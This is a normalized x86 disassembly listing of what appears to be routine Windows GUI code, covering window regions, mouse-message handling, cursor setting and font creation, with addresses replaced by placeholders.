je r-xdata
cmp [ edx + 0xab ] 0x0
push esi
mov esi [ ecx ]
sete dl
movzx edx dl
push 0x0
push edx
push eax
mov eax [ esi + 0x20 ]
call eax
pop esi
sub_426e80
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
push edi
mov edi ecx
xor ecx ecx
mov [ edi + 0x28 ] al
cmp al cl
je r-xdata
mov [ edi + 0x29 ] 0x101
mov eax [ edi + 0x4 ]
mov [ edi + 0x29 ] cx
cmp eax ecx
je r-xdata
pop edi
pop ebp
retn 0x4
push esi
lea esi [ eax + 0x6c ]
call sub_4028b0
mov eax [ edi + 0x4 ]
call sub_4142d0
pop esi
pop edi
pop ebp
retn 0x4
sub_426ec0
push ebp
mov ebp esp
mov eax ecx
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
xor al al
pop ebp
retn 0x4
mov edx [ ebp + 0x8 ]
mov [ ecx + 0xa0 ] edx
cmp [ eax + 0x24 ] 0x0
push ebx
mov bl 0x1
je r-xdata
mov al bl
pop ebx
pop ebp
retn 0x4
cmp [ eax + 0x25 ] 0x0
je r-xdata
cmp [ eax + 0x26 ] 0x0
je r-xdata
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
cmp [ edx + 0xab ] 0x0
mov ecx [ eax + 0x1c ]
push esi
mov esi [ ecx ]
sete dl
movzx edx dl
push 0x0
push edx
push eax
mov eax [ esi + 0x20 ]
call eax
pop esi
sub_426f40
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_426f90
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_426fd0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_445038
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x1c ] eax
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x30 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov edi ecx
test edi edi
je r-xdata
xor al al
test eax eax
je r-xdata
mov [ ebx + 0x4 ] eax
call [ GetTickCount@IAT ]
xor esi esi
mov [ esp + 0x10 ] esi
push edi
mov [ esp + 0x10 ] r--data
mov [ esp + 0x18 ] 0xff00ff
call sub_43d470
mov edi eax
xor eax eax
cmp edi eax
je r-xdata
mov [ esp + 0x38 ] eax
cmp esi eax
je r-xdata
push 0xff00ff
mov ecx edi
call sub_43d6f0
mov esi eax
push edi
mov [ esp + 0x14 ] esi
call [ DeleteObject@IAT ]
xor eax eax
mov [ esp + 0x38 ] 0xffffffff
mov [ esp + 0xc ] r--data
mov al 0x1
jmp r-xdata
mov [ esp + 0x18 ] eax
mov [ esp + 0x1c ] eax
mov [ esp + 0x20 ] eax
mov [ esp + 0x24 ] eax
lea eax [ esp + 0x18 ]
push eax
push esi
call [ GetRgnBox@IAT ]
mov ecx [ ebx + 0x4 ]
push 0x1
push esi
push ecx
call [ SetWindowRgn@IAT ]
push esi
call [ DeleteObject@IAT ]
mov [ ebx + 0x8 ] 0x1
mov ecx [ esp + 0x30 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ esp + 0x1c ]
xor ecx esp
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
sub_4270e0
push ebp
mov ebp esp
push 0xffffffff
push sub_445cbb
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
call sub_40e3c0
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov [ eax + 0x70 ] r--data
mov dl 0x1
mov [ ebp - 0x4 ] dl
mov [ eax ] r--data
mov [ eax + 0x70 ] r--data
mov [ eax + 0x68 ] dl
mov [ ebp - 0x4 ] 0x2
mov edx 0x9
mov [ eax ] r--data
mov [ eax + 0x70 ] r--data
mov [ eax + 0x7c ] ecx
mov [ eax + 0xc ] edx
mov [ eax + 0x10 ] edx
mov [ eax + 0x74 ] cx
mov [ eax + 0x78 ] ecx
mov [ eax + 0x76 ] cl
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x4
sub_427170
push ebp
mov ebp esp
push 0xffffffff
push sub_4459bb
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
or ecx 0xffffffff
mov [ ebp - 0x4 ] ecx
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov eax 0x1
mov [ ebp - 0x4 ] eax
mov [ esi + 0x70 ] r--data
mov [ ebp - 0x4 ] ecx
mov [ esi ] r--data
test [ ebp + 0x8 ] al
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_427200
push ebp
mov ebp esp
push 0xffffffff
push sub_445c7b
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
mov [ ecx + 0x70 ] r--data
or eax 0xffffffff
mov [ ebp - 0x4 ] eax
mov [ ecx ] r--data
mov [ ecx + 0x70 ] r--data
mov [ ebp - 0x4 ] 0x1
mov [ ecx + 0x70 ] r--data
mov [ ebp - 0x4 ] eax
mov [ ecx ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_427270
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
mov esi ecx
mov ecx [ ebp + 0x8 ]
push eax
push ecx
mov ecx esi
call sub_40e4c0
mov edi [ esi + 0x4 ]
lea ecx [ edi + 0xb0 ]
lea ebx [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
mov [ ebp + 0x8 ] 0x1
call sub_414260
mov eax [ ebp - 0x4 ]
cmp eax [ edi + 0xb4 ]
je r-xdata
xor eax eax
mov eax [ eax + 0x10 ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp [ ecx + 0xc ] 0x17
pop edi
sete dl
mov [ esi + 0x76 ] dl
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov al [ edi + 0xc0 ]
mov [ esi + 0x74 ] al
test eax eax
setne dl
cmp [ esi + 0x25 ] 0x0
mov [ esi + 0x75 ] dl
jne r-xdata
sub_4272f0
push esi
push edi
mov esi ecx
mov ecx [ esi - 0x54 ]
lea edi [ esi - 0x70 ]
push edi
push 0x2a3
call sub_412fd0
mov ecx [ esi - 0x54 ]
push edi
push 0x20
call sub_412fd0
mov ecx [ esi - 0x54 ]
push edi
push 0x200
call sub_412fd0
mov ecx [ esi - 0x54 ]
push edi
push 0x201
call sub_412fd0
mov ecx [ esi - 0x54 ]
push edi
push 0x202
call sub_412fd0
mov ecx [ esi - 0x54 ]
push edi
push 0x203
call sub_412fd0
mov ecx [ esi - 0x54 ]
push edi
push 0x205
call sub_412fd0
pop edi
pop esi
retn
sub_427360
push ebp
mov ebp esp
and esp 0xfffffff8
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
push eax
push edx
add ecx 0x30
push ecx
call [ PtInRect@IAT ]
neg eax
sbb eax eax
neg eax
mov esp ebp
pop ebp
retn 0xc
sub_427390
push ebp
mov ebp esp
sub esp 0x8
push edi
mov edi ecx
cmp [ edi + 0x24 ] 0x0
je r-xdata
pop edi
mov esp ebp
pop ebp
retn 0xc
cmp [ edi + 0x25 ] 0x0
je r-xdata
cmp [ edi + 0x26 ] 0x0
je r-xdata
push ebx
push esi
mov esi [ edi + 0x4 ]
lea ecx [ esi + 0xb0 ]
lea ebx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x4 ] 0x0
call sub_414260
mov eax [ ebp - 0x8 ]
cmp eax [ esi + 0xb4 ]
je r-xdata
xor eax eax
mov eax [ eax + 0x10 ]
jmp r-xdata
mov edx [ edi ]
mov edx [ edx + 0x94 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
call edx
pop esi
pop ebx
cmp [ edi + 0x75 ] 0x0
je r-xdata
cmp [ edi + 0x76 ] 0x0
jne r-xdata
cmp [ edi + 0x74 ] 0x0
je r-xdata
mov eax 0x1
call sub_413ad0
sub_427410
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi ecx
mov [ ebp - 0x18 ] eax
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_443fba
mov esp ebp
pop ebp
retn 0x8
cmp [ edi + 0x76 ] 0x0
mov edx [ edi + 0x6c ]
je r-xdata
mov ecx [ edi + 0x38 ]
sub ecx [ edi + 0x30 ]
push ebx
lea ebx [ edi + 0x30 ]
xor eax eax
mov [ ebp - 0x8 ] 0x0
cmp [ edi + 0x27 ] al
jne r-xdata
cmp [ edi + 0x74 ] 0x0
je r-xdata
test dl 0x4
jne r-xdata
mov eax 0x3
jmp r-xdata
and edx 0xfffffffe
or edx 0x1
jmp r-xdata
mov eax 0x2
jmp r-xdata
test dl 0x1
je r-xdata
mov edx [ esi ]
imul eax ecx
mov edx [ edx + 0xc ]
mov [ ebp - 0x14 ] eax
add eax ecx
mov [ ebp - 0xc ] eax
mov eax [ esi + 0x14 ]
push eax
mov ecx esi
mov [ ebp - 0x10 ] 0x0
call edx
mov eax [ esi + 0x10 ]
mov edx [ esi ]
mov edx [ edx + 0x14 ]
mov [ ebp - 0x8 ] eax
mov eax [ edi + 0x4 ]
movzx ecx [ eax + 0xa9 ]
push ecx
mov ecx [ ebp - 0x18 ]
lea eax [ ebp - 0x14 ]
push eax
push ebx
push ecx
mov ecx esi
call edx
pop ebx
test dl 0x2
je r-xdata
mov eax 0x1
sub_4274e0
push ebp
mov ebp esp
sub esp 0x8
push ebx
push edi
mov edi [ esi + 0x4 ]
lea ecx [ edi + 0xb0 ]
lea ebx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x4 ] 0x0
call sub_414260
mov eax [ ebp - 0x8 ]
cmp eax [ edi + 0xb4 ]
je r-xdata
xor eax eax
pop edi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ebx [ eax + 0x10 ]
test ebx ebx
jne r-xdata
mov edx [ esi + 0x30 ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x1
cmp eax edx
jle r-xdata
mov [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x34 ]
mov ecx [ ebp + 0xc ]
cmp ecx edi
jle r-xdata
cmp eax [ esi + 0x38 ]
jge r-xdata
cmp ecx [ esi + 0x3c ]
jge r-xdata
sub ecx edi
mov edi [ ebx ]
sub eax edx
push ecx
mov ecx [ esi + 0x1c ]
push eax
mov eax [ ecx ]
mov edx [ eax + 0x28 ]
push 0x1
call edx
push eax
mov eax [ edi + 0x28 ]
mov ecx ebx
call eax
cmp eax 0xff00ff
jne r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_427580
push ebp
mov ebp esp
and esp 0xfffffff8
push ecx
push ebx
push esi
push edi
mov edi ecx
mov eax [ edi - 0x70 ]
mov edx [ eax + 0x78 ]
lea esi [ edi - 0x70 ]
mov ecx esi
mov [ esp + 0xc ] edi
call edx
test al al
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0x14
mov eax [ ebp + 0xc ]
cmp eax 0x2a3
jne r-xdata
cmp eax 0x20
jne r-xdata
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x14 ]
mov eax [ esi ]
mov eax [ eax + 0x80 ]
push ecx
mov ecx [ ebp + 0x10 ]
push edx
mov edx [ ebp + 0x8 ]
push ecx
push edx
mov ecx esi
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
lea ecx [ eax - 0x200 ]
cmp ecx 0xe
ja r-xdata
cmp [ edi - 0x49 ] 0x0
je r-xdata
cmp [ edi - 0x49 ] 0x0
jne r-xdata
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x14 ]
mov edx [ esi ]
mov edx [ edx + 0x84 ]
push eax
mov eax [ ebp + 0x10 ]
push ecx
mov ecx [ ebp + 0x8 ]
push eax
push ecx
mov ecx esi
call edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
mov eax [ ebp + 0x14 ]
mov edx [ esp + 0xc ]
movsx edi ax
shr eax 0x10
movsx ebx ax
push ebx
push edi
add edx 0xffffffc0
push edx
call [ PtInRect@IAT ]
test eax eax
je r-xdata
cmp eax 0x200
jne r-xdata
mov edx [ ebp + 0xc ]
lea ecx [ edx - 0x200 ]
cmp ecx 0x5
ja r-xdata
mov ecx [ esp + 0xc ]
mov edx [ ecx - 0x6c ]
cmp [ edx + 0xc2 ] 0x0
je r-xdata
jmp [ ecx * 4 + jump_table_427724 ]
push ebx
push edi
call sub_4274e0
mov ecx [ ebp + 0x18 ]
mov edx [ esi ]
mov edx [ edx + 0x7c ]
push ecx
mov ecx [ ebp + 0x14 ]
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
push eax
mov ecx esi
call edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
test eax eax
je r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
mov ecx [ ebp + 0x18 ]
mov eax [ esi ]
mov eax [ eax + 0x88 ]
push ecx
mov ecx [ ebp + 0x14 ]
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
push edx
mov edx [ ebp + 0x8 ]
push edx
mov ecx esi
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x14 ]
mov edx [ esi ]
mov edx [ edx + 0x8c ]
push eax
mov eax [ ebp + 0x10 ]
push ecx
mov ecx [ ebp + 0x8 ]
push eax
push ecx
mov ecx esi
call edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x14 ]
mov eax [ esi ]
mov eax [ eax + 0x90 ]
push ecx
mov ecx [ ebp + 0x10 ]
push edx
mov edx [ ebp + 0x8 ]
push ecx
push edx
mov ecx esi
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
sub_427740
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi + 0x1c ] 0x0
je r-xdata
pop esi
pop ebp
retn 0x4
push ebx
push edi
xor edi edi
cmp [ esi + 0x75 ] 0x0
je r-xdata
mov ebx [ ebp + 0x8 ]
cmp ebx 0x111
jne r-xdata
xor eax eax
cmp [ esi + 0x74 ] al
setne al
mov edi eax
mov edx [ esi + 0x4 ]
mov edx [ edx + 0x4 ]
mov ecx [ esi + 0x1c ]
mov eax [ ecx ]
mov eax [ eax + 0x10 ]
push edi
push edx
push ebx
push esi
call eax
pop edi
pop ebx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov eax [ eax + 0x4 ]
mov ecx [ ecx + 0x44 ]
mov edx [ ecx ]
mov edx [ edx + 0x18 ]
push edi
push eax
push 0x111
push esi
call edx
mov ecx [ eax + 0x14 ]
cmp ecx 0x9567957
je r-xdata
cmp ecx 0x77ddf67
je r-xdata
cmp ecx 0x97ddae7
je r-xdata
sub_4277d0
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push esi
mov esi ecx
mov eax [ esi + 0x6c ]
je r-xdata
push ebx
xor bl bl
test al 0x4
je r-xdata
test al 0x2
jne r-xdata
mov eax [ esi + 0x6c ]
test al 0x2
je r-xdata
and eax 0xfffffffb
mov [ esi + 0x6c ] eax
cmp [ esi + 0x27 ] bl
je r-xdata
mov ecx [ ebp + 0x18 ]
mov [ ecx ] 0x1
mov eax 0x1
pop esi
pop ebp
retn 0x14
test al 0x4
jne r-xdata
test bl bl
pop ebx
je r-xdata
and eax 0xfffffffd
cmp [ esi + 0x27 ] 0x0
mov [ esi + 0x6c ] eax
je r-xdata
mov bl 0x1
or [ esi + 0x6c ] 0x2
cmp [ esi + 0x27 ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
xor eax eax
pop esi
pop ebp
retn 0x14
cmp [ esi + 0x24 ] 0x0
je r-xdata
test [ esi + 0x78 ] 0x8
je r-xdata
mov bl 0x1
mov eax esi
call sub_426dd0
mov ecx [ esi + 0x1c ]
mov [ esi + 0x7c ] 0x200
test ecx ecx
je r-xdata
mov eax [ eax + 0x68 ]
cmp [ eax - 0xc ] 0x0
je r-xdata
cmp [ esi + 0x25 ] 0x0
je r-xdata
mov ecx [ esi + 0x1c ]
test ecx ecx
je r-xdata
mov [ esi + 0x7c ] 0x0
mov edx [ ecx ]
mov eax [ edx + 0x3c ]
push esi
call eax
mov ecx [ esi + 0x4 ]
mov edx [ ecx + 0x6c ]
cmp [ edx - 0xc ] 0x0
je r-xdata
cmp [ esi + 0x26 ] 0x0
je r-xdata
mov eax [ esi + 0x8 ]
mov edx [ ecx ]
mov edx [ edx + 0x10 ]
push 0x0
push eax
push 0x2a3
push esi
call edx
mov edx [ ebp + 0x14 ]
mov ecx [ esi + 0x1c ]
mov eax [ ecx ]
mov eax [ eax + 0x38 ]
push 0x1
push edx
mov edx [ ebp + 0x10 ]
push edx
push 0x200
call eax
mov ecx [ esi + 0x1c ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
cmp [ eax + 0xab ] 0x0
mov edx [ ecx ]
mov edx [ edx + 0x20 ]
sete al
movzx eax al
push 0x0
push eax
push esi
call edx
sub_4278f0
push esi
mov esi ecx
mov eax [ esi + 0x6c ]
test al 0x6
je r-xdata
xor eax eax
pop esi
retn 0x10
and eax 0xfffffff9
cmp [ esi + 0x24 ] 0x0
mov [ esi + 0x6c ] eax
je r-xdata
test [ esi + 0x78 ] 0x8
je r-xdata
cmp [ esi + 0x25 ] 0x0
je r-xdata
mov ecx [ esi + 0x1c ]
test ecx ecx
je r-xdata
cmp [ esi + 0x26 ] 0x0
je r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x10 ]
push 0x0
push 0x0
push 0x2a3
push esi
call edx
mov ecx [ esi + 0x1c ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
cmp [ eax + 0xab ] 0x0
mov edx [ ecx ]
mov edx [ edx + 0x20 ]
sete al
movzx eax al
push 0x0
push eax
push esi
call edx
sub_427960
push ebp
mov ebp esp
test [ ecx + 0x6c ] 0x2
je r-xdata
xor eax eax
pop ebp
retn 0x10
mov eax [ ebp + 0x14 ]
mov [ eax ] 0x1
mov ecx [ ecx + 0x4 ]
mov eax [ ecx + 0x5c ]
test eax eax
je r-xdata
mov eax 0x1
pop ebp
retn 0x10
push eax
call [ SetCursor@IAT ]
sub_427990
push ebp
mov ebp esp
push esi
mov esi ecx
or [ esi + 0x6c ] 0x4
cmp [ esi + 0x24 ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
cmp [ esi + 0x25 ] 0x0
je r-xdata
mov ecx [ eax + 0x68 ]
cmp [ ecx - 0xc ] 0x0
je r-xdata
cmp [ eax + 0x60 ] 0x0
jne r-xdata
cmp [ esi + 0x26 ] 0x0
je r-xdata
test [ esi + 0x78 ] 0x1
je r-xdata
mov ecx [ esi + 0x1c ]
mov [ esi + 0x7c ] 0x2a3
test ecx ecx
je r-xdata
mov ecx [ esi + 0x1c ]
test ecx ecx
je r-xdata
mov edx [ ebp + 0x18 ]
mov [ edx ] 0x1
xor eax eax
pop esi
pop ebp
retn 0x14
mov edx [ esi ]
mov eax [ edx + 0x98 ]
push 0x201
mov ecx esi
call eax
mov ecx [ ebp + 0x18 ]
mov [ ecx ] 0x1
xor eax eax
pop esi
pop ebp
retn 0x14
mov [ esi + 0x7c ] 0x0
mov edx [ eax + 0x6c ]
cmp [ edx - 0xc ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x14 ]
mov eax [ ecx ]
mov eax [ eax + 0x38 ]
push 0x0
push edx
mov edx [ ebp + 0x10 ]
push edx
push 0x2a3
call eax
cmp [ eax + 0xab ] 0x0
mov edx [ ecx ]
mov edx [ edx + 0x20 ]
sete al
movzx eax al
push 0x0
push eax
push esi
call edx
sub_427a50
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x6c ]
test al 0x4
je r-xdata
mov eax [ ebp + 0x14 ]
mov [ eax ] 0x1
xor eax eax
pop esi
pop ebp
retn 0x10
cmp [ esi + 0x75 ] 0x0
je r-xdata
and eax 0xfffffffb
cmp [ esi + 0x24 ] 0x0
mov [ esi + 0x6c ] eax
je r-xdata
mov ecx [ esi + 0x4 ]
cmp [ ecx + 0xc1 ] 0x0
je r-xdata
mov eax [ esi ]
mov edx [ eax + 0x98 ]
push 0x111
mov ecx esi
call edx
test [ esi + 0x78 ] 0x2
je r-xdata
cmp [ esi + 0x25 ] 0x0
je r-xdata
cmp [ esi + 0x74 ] 0x0
sete dl
mov [ esi + 0x74 ] dl
mov eax [ esi ]
mov edx [ eax + 0x98 ]
push 0x202
mov ecx esi
call edx
cmp [ esi + 0x26 ] 0x0
je r-xdata
mov ecx [ esi + 0x1c ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
cmp [ eax + 0xab ] 0x0
mov edx [ ecx ]
mov edx [ edx + 0x20 ]
sete al
movzx eax al
push 0x0
push eax
push esi
call edx
sub_427af0
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
mov [ eax ] 0x1
test [ ecx + 0x78 ] 0x4
je r-xdata
mov eax 0x1
pop ebp
retn 0x10
mov edx [ ecx ]
mov eax [ edx + 0x98 ]
push 0x205
call eax
sub_427b30
push esi
push r--data
push 0x0
push 0x2
mov esi [ CreateFontW@IAT ]
push 0x0
push 0x0
push 0x86
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0xd
mov [ rw-data ] r--data
mov [ rw-data ] 0x0
call esi
push r--data
push 0x0
push 0x2
push 0x0
push 0x0
push 0x86
push 0x0
push 0x1
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0xd
mov [ rw-data ] eax
call esi
push r--data
push 0x0
push 0x2
push 0x0
push 0x0
push 0x86
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0xd
mov [ rw-data ] eax
call esi
push r--data
push 0x0
push 0x2
push 0x0
push 0x0
push 0x86
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0xd
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
mov eax rw-data
pop esi
retn
sub_427c00
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_427c30
push ebp
mov ebp esp
cmp [ esi + 0x4 ] 0x0
push ebx
push edi
mov edi eax
mov ebx ecx
jne r-xdata
test edi edi
je r-xdata
mov [ esi + 0x4 ] 0x1
call [ Ordinal_crt_10@IAT ]
test al al
je r-xdata
mov edi r--data
cmp [ edi ] 0x0
jne r-xdata
mov [ esi + 0x5 ] 0x1
movzx eax [ ebp + 0x8 ]
push edi
push 0x0
push 0x2
push 0x0
push 0x0
push 0x86
push 0x0
push 0x0
neg eax
push 0x0
sbb eax eax
and eax 0x2bc
push eax
push 0x0
push 0x0
push 0x0
push ebx
call [ CreateFontW@IAT ]
pop edi
pop ebx
pop ebp
retn 0x4
mov ebx 0xd
test ebx ebx
jne r-xdata
sub_427ca0
push ebp
mov ebp esp
push 0xffffffff
push sub_445c3e
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
xor edi edi
mov [ ebp - 0x4 ] edi
mov eax [ esi + 0x8 ]
mov ebx [ operator delete@IAT ]
cmp eax edi
je r-xdata
or ecx 0xffffffff
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
mov [ esi + 0x10 ] edi
mov [ ebp - 0x4 ] ecx
lea eax [ esi + 0x4 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] ecx
mov eax [ eax ]
sub eax 0x10
lea edx [ eax + 0xc ]
[ edx ] ecx
dec ecx
test ecx ecx
jg r-xdata
push eax
call ebx
add esp 0x4
test [ ebp + 0x8 ] 0x1
je r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push esi
call ebx
add esp 0x4
sub_427d40
push ebp
mov ebp esp
push esi
push edi
mov edi eax
lea esi [ edi + 0x8 ]
lea ecx [ ebp + 0x8 ]
call sub_428170
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
mov ecx [ eax + 0x44 ]
mov esi [ edi + 0x4 ]
add edi 0x4
lea eax [ ecx - 0x10 ]
sub esi 0x10
cmp eax esi
je r-xdata
pop edi
pop esi
pop ebp
retn 0x4
cmp [ esi + 0xc ] 0x0
push ebx
lea ebx [ esi + 0xc ]
jl r-xdata
mov ebx [ ecx - 0xc ]
push ecx
push edi
call sub_402910
pop ebx
mov edx [ eax ]
cmp edx [ esi ]
jne r-xdata
call sub_4025f0
mov [ ebp + 0x8 ] eax
or eax 0xffffffff
[ ebx ] eax
dec eax
test eax eax
jg r-xdata
mov ecx [ ebp + 0x8 ]
add ecx 0x10
pop ebx
mov [ edi ] ecx
pop edi
pop esi
pop ebp
retn 0x4
mov ecx [ esi ]
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
push esi
call eax
sub_427dc0
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_427df0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_427df0
push ebp
mov ebp esp
push 0xffffffff
push sub_44500b
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov eax [ esi + 0x8 ]
sub eax [ esi + 0x4 ]
xor edi edi
sar eax 0x2
test eax eax
je r-xdata
mov ecx [ esi + 0x8 ]
mov edi [ esi + 0x4 ]
cmp edi ecx
je r-xdata
mov ecx [ esi + 0x4 ]
mov ecx [ ecx + edi * 4 ]
cmp ecx ebx
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ esi + 0x4 ]
cmp eax ebx
je r-xdata
mov eax ecx
sub eax ecx
sar eax 0x2
lea ebx [ eax * 4 ]
push ebx
push ecx
push edi
call [ memmove@IAT ]
add ebx edi
add esp 0xc
mov [ esi + 0x8 ] ebx
xor ebx ebx
mov ecx [ esi + 0x8 ]
sub ecx [ esi + 0x4 ]
inc edi
sar ecx 0x2
cmp edi ecx
jb r-xdata
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push eax
call [ operator delete@IAT ]
add esp 0x4
sub_427ec0
push ebp
mov ebp esp
push 0xffffffff
push sub_449b7e
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x4 ]
mov edx [ ecx + 0x44 ]
xor edi edi
mov [ ebp - 0x10 ] ecx
cmp [ edx - 0xc ] edi
jne r-xdata
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x4 ]
mov edx [ esi + 0x8 ]
sub edx eax
sar edx 0x2
xor ebx ebx
test edx edx
jne r-xdata
push 0x18
call [ operator new@IAT ]
